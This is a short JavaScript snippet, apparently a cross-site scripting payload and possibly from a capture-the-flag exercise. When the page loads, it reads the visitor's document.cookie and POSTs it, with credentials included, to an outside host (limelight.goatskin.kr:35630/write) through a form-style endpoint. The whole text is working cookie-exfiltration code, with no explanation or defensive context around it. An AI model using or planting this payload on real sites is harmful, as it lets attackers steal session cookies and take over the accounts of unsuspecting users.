window.onload = () => {
          fetch("http://limelight.goatskin.kr:35630/write", {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
            },
            credentials: "include",
            body: "title=" + encodeURIComponent(document.cookie) + "&author=93&img=1&content=1"
          });
      };
